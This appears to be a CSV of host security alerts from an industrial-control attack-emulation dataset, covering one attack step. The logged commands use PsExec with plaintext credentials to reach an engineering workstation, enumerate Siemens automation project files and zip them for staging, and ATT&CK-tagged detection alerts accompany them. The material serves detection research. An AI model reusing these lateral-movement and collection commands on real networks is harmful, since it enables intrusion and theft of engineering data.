4674,Attack Step 4,"May 9, 2025 @ 16:22:12.444",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,3,3088,,,,,10.12.25.5,epmap,Windows11\\Windows11,,,,3,92105,Possible suspicious access to Windows admin shares,[T1021.002],[Lateral Movement],[SMB/Windows Admin Shares]
4675,Attack Step 4,"May 9, 2025 @ 16:22:12.492",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,1,3668,,,,,,,WINDOWS11EWS\\Windows11EWS,C:\\WINDOWS\\PSEXESVC.exe,"\""cmd.exe\"" /c \""dir /s /b C:\\ProgramData\\Siemens\\Automation\\*.ap* C:\\ProgramData\\Siemens\\Automation\\*.zap* &gt; C:\\Windows\\Temp\\siemens_targeted3.txt\""",,4,92052,Windows command prompt started by an abnormal process,[T1059.003],[Execution],[Windows Command Shell]
4676,Attack Step 4,"May 9, 2025 @ 16:22:13.021",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4677,Attack Step 4,"May 9, 2025 @ 16:23:44.675",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4678,Attack Step 4,"May 9, 2025 @ 16:23:44.772",16,10.12.25.5,Windows11EWS,System,7045,916,,,,,,,,,,,12,92650,New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares.,[T1021.002 T1569.002],"[Lateral Movement, Execution]","[SMB/Windows Admin Shares, Service Execution]"
4679,Attack Step 4,"May 9, 2025 @ 16:23:44.773",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4680,Attack Step 4,"May 9, 2025 @ 16:23:44.948",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\Users\\Public\\PsTools4\\PsExec.exe\"" \\\\10.12.25.5 -u Windows11EWS -p Windows11EWS cmd.exe /c \""dir /s /b C:\\ProgramData\\Siemens\\Automation\\*.ap* C:\\ProgramData\\Siemens\\Automation\\*.zap* &gt; C:\\Windows\\Temp\\siemens_targeted3.txt\""",,3,67027,A process was created.,,,
4681,Attack Step 4,"May 9, 2025 @ 16:23:44.981",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,13,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,3,92307,Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\PSEXESVC\\ImagePath binary is: %%SystemRoot%%\\PSEXESVC.exe,[T1543.003],"[Persistence, Privilege Escalation]",[Windows Service]
4682,Attack Step 4,"May 9, 2025 @ 16:23:44.982",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,11,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,6,92218,Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process,[T1570],[Lateral Movement],[Lateral Tool Transfer]
4683,Attack Step 4,"May 9, 2025 @ 16:23:45.026",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4684,Attack Step 4,"May 9, 2025 @ 16:23:45.048",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4685,Attack Step 4,"May 9, 2025 @ 16:23:45.176",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\PSEXESVC.exe,,3,67027,A process was created.,,,
4686,Attack Step 4,"May 9, 2025 @ 16:23:45.316",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,67024,Service logon event registered from non standard service account.,,,
4687,Attack Step 4,"May 9, 2025 @ 16:23:45.317",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4688,Attack Step 4,"May 9, 2025 @ 16:23:46.274",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""cmd.exe\"" /c \""dir /s /b C:\\ProgramData\\Siemens\\Automation\\*.ap* C:\\ProgramData\\Siemens\\Automation\\*.zap* &gt; C:\\Windows\\Temp\\siemens_targeted3.txt\""",,3,67027,A process was created.,,,
4689,Attack Step 4,"May 9, 2025 @ 16:23:46.284",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4690,Attack Step 4,"May 9, 2025 @ 16:23:46.296",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4691,Attack Step 4,"May 9, 2025 @ 16:23:46.422",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,1,3668,,,,,,,WINDOWS11EWS\\Windows11EWS,C:\\WINDOWS\\PSEXESVC.exe,"\""cmd.exe\"" /c \""dir /s /b C:\\ProgramData\\Siemens\\Automation\\*.ap* C:\\ProgramData\\Siemens\\Automation\\*.zap* &gt; C:\\Windows\\Temp\\siemens_targeted3.txt\""",,4,92052,Windows command prompt started by an abnormal process,[T1059.003],[Execution],[Windows Command Shell]
4692,Attack Step 4,"May 9, 2025 @ 16:23:46.726",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,3,3088,,,,,10.12.25.5,epmap,Windows11\\Windows11,,,,3,92105,Possible suspicious access to Windows admin shares,[T1021.002],[Lateral Movement],[SMB/Windows Admin Shares]
4693,Attack Step 4,"May 9, 2025 @ 16:23:47.393",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\System32\\SearchProtocolHost.exe\"" Global\\UsGthrFltPipeMssGthrPipe4_ Global\\UsGthrCtrlFltPipeMssGthrPipe4 1 -2147483646 \""Software\\Microsoft\\Windows Search\"" \""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\"" \""C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc\"" \""DownLevelDaemon\""",,3,67027,A process was created.,,,
4694,Attack Step 4,"May 9, 2025 @ 16:24:48.915",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4695,Attack Step 4,"May 9, 2025 @ 16:24:48.978",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4696,Attack Step 4,"May 9, 2025 @ 16:24:49.055",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\Users\\Public\\PsTools4\\PsExec.exe\"" \\\\10.12.25.5 -u Windows11EWS -p Windows11EWS cmd.exe /c \""dir /s /b C:\\Users\\Engineer\\Documents\\Project* &gt; C:\\Windows\\Temp\\project_file_list2.txt\""",,3,67027,A process was created.,,,
4697,Attack Step 4,"May 9, 2025 @ 16:24:49.110",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4698,Attack Step 4,"May 9, 2025 @ 16:24:49.207",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,11,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,6,92218,Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process,[T1570],[Lateral Movement],[Lateral Tool Transfer]
4699,Attack Step 4,"May 9, 2025 @ 16:24:49.209",16,10.12.25.5,Windows11EWS,System,7045,916,,,,,,,,,,,12,92650,New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares.,[T1021.002 T1569.002],"[Lateral Movement, Execution]","[SMB/Windows Admin Shares, Service Execution]"
4700,Attack Step 4,"May 9, 2025 @ 16:24:49.215",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,13,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,3,92307,Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\PSEXESVC\\ImagePath binary is: %%SystemRoot%%\\PSEXESVC.exe,[T1543.003],"[Persistence, Privilege Escalation]",[Windows Service]
4701,Attack Step 4,"May 9, 2025 @ 16:24:49.465",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4702,Attack Step 4,"May 9, 2025 @ 16:24:49.566",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\PSEXESVC.exe,,3,67027,A process was created.,,,
4703,Attack Step 4,"May 9, 2025 @ 16:24:50.839",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,67024,Service logon event registered from non standard service account.,,,
4704,Attack Step 4,"May 9, 2025 @ 16:24:50.858",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4705,Attack Step 4,"May 9, 2025 @ 16:24:50.858",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""cmd.exe\"" /c \""dir /s /b C:\\Users\\Engineer\\Documents\\Project* &gt; C:\\Windows\\Temp\\project_file_list2.txt\""",,3,67027,A process was created.,,,
4706,Attack Step 4,"May 9, 2025 @ 16:24:50.887",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4707,Attack Step 4,"May 9, 2025 @ 16:24:51.436",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,3,3088,,,,,10.12.25.5,epmap,Windows11\\Windows11,,,,3,92105,Possible suspicious access to Windows admin shares,[T1021.002],[Lateral Movement],[SMB/Windows Admin Shares]
4708,Attack Step 4,"May 9, 2025 @ 16:24:51.469",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,1,3668,,,,,,,WINDOWS11EWS\\Windows11EWS,C:\\WINDOWS\\PSEXESVC.exe,"\""cmd.exe\"" /c \""dir /s /b C:\\Users\\Engineer\\Documents\\Project* &gt; C:\\Windows\\Temp\\project_file_list2.txt\""",,4,92052,Windows command prompt started by an abnormal process,[T1059.003],[Execution],[Windows Command Shell]
4709,Attack Step 4,"May 9, 2025 @ 16:24:52.971",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4710,Attack Step 4,"May 9, 2025 @ 16:25:14.742",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4711,Attack Step 4,"May 9, 2025 @ 16:25:14.749",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4712,Attack Step 4,"May 9, 2025 @ 16:26:31.767",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\uus\\packages\\preview\\AMD64\\MoUsoCoreWorker.exe\"" useprivatenamespaces",,3,67027,A process was created.,,,
4713,Attack Step 4,"May 9, 2025 @ 16:26:31.768",15,10.12.25.3,Windows11,Security,4624,888,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4714,Attack Step 4,"May 9, 2025 @ 16:26:31.852",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k wusvcs -p,,3,67027,A process was created.,,,
4715,Attack Step 4,"May 9, 2025 @ 16:26:33.388",15,10.12.25.3,Windows11,Security,4673,4,,,,,,,,,,,4,60107,Failed attempt to perform a privileged operation,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4716,Attack Step 4,"May 9, 2025 @ 16:26:33.396",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\BackgroundTaskHost.exe\"" -ServerName:BackgroundTaskHost.WebAccountProvider",,3,67027,A process was created.,,,
4717,Attack Step 4,"May 9, 2025 @ 16:26:33.408",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\Windows\\System32\\RuntimeBroker.exe -Embedding,,3,67027,A process was created.,,,
4718,Attack Step 4,"May 9, 2025 @ 16:26:42.221",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4719,Attack Step 4,"May 9, 2025 @ 16:26:42.303",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4720,Attack Step 4,"May 9, 2025 @ 16:26:42.403",16,10.12.25.5,Windows11EWS,System,7045,916,,,,,,,,,,,12,92650,New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares.,[T1021.002 T1569.002],"[Lateral Movement, Execution]","[SMB/Windows Admin Shares, Service Execution]"
4721,Attack Step 4,"May 9, 2025 @ 16:26:42.405",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,11,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,6,92218,Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process,[T1570],[Lateral Movement],[Lateral Tool Transfer]
4722,Attack Step 4,"May 9, 2025 @ 16:26:42.406",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\Users\\Public\\PsTools4\\PsExec.exe\"" \\\\10.12.25.5 -u Windows11EWS -p Windows11EWS powershell.exe -Command \""Compress-Archive -Path 'C:\\Users\\Engineer\\Documents\\Project Files' -DestinationPath 'C:\\Windows\\Temp\\siemens_project3.zip'\""",,3,67027,A process was created.,,,
4723,Attack Step 4,"May 9, 2025 @ 16:26:42.437",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,13,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,3,92307,Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\PSEXESVC\\ImagePath binary is: %%SystemRoot%%\\PSEXESVC.exe,[T1543.003],"[Persistence, Privilege Escalation]",[Windows Service]
4724,Attack Step 4,"May 9, 2025 @ 16:26:42.438",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4725,Attack Step 4,"May 9, 2025 @ 16:26:42.489",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,1,3668,,,,,,,WINDOWS11EWS\\Windows11EWS,C:\\WINDOWS\\PSEXESVC.exe,"\""powershell.exe\"" -Command \""Compress-Archive -Path 'C:\\Users\\Engineer\\Documents\\Project Files' -DestinationPath 'C:\\Windows\\Temp\\siemens_project3.zip'\""",,3,92068,"PSEXEC was used to execute: \""powershell.exe\"" -Command \""Compress-Archive -Path 'C:\\Users\\Engineer\\Documents\\Project Files' -DestinationPath 'C:\\Windows\\Temp\\siemens_project3.zip'\""",[T1569.002],[Execution],[Service Execution]
4726,Attack Step 4,"May 9, 2025 @ 16:26:42.502",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\PSEXESVC.exe,,3,67027,A process was created.,,,
4727,Attack Step 4,"May 9, 2025 @ 16:26:42.503",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4728,Attack Step 4,"May 9, 2025 @ 16:26:42.604",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,67024,Service logon event registered from non standard service account.,,,
4729,Attack Step 4,"May 9, 2025 @ 16:26:42.661",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4730,Attack Step 4,"May 9, 2025 @ 16:26:42.702",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""powershell.exe\"" -Command \""Compress-Archive -Path 'C:\\Users\\Engineer\\Documents\\Project Files' -DestinationPath 'C:\\Windows\\Temp\\siemens_project3.zip'\""",,3,67027,A process was created.,,,
4731,Attack Step 4,"May 9, 2025 @ 16:26:43.598",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4732,Attack Step 4,"May 9, 2025 @ 16:26:44.280",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,3,3088,,,,,10.12.25.5,epmap,Windows11\\Windows11,,,,3,92105,Possible suspicious access to Windows admin shares,[T1021.002],[Lateral Movement],[SMB/Windows Admin Shares]
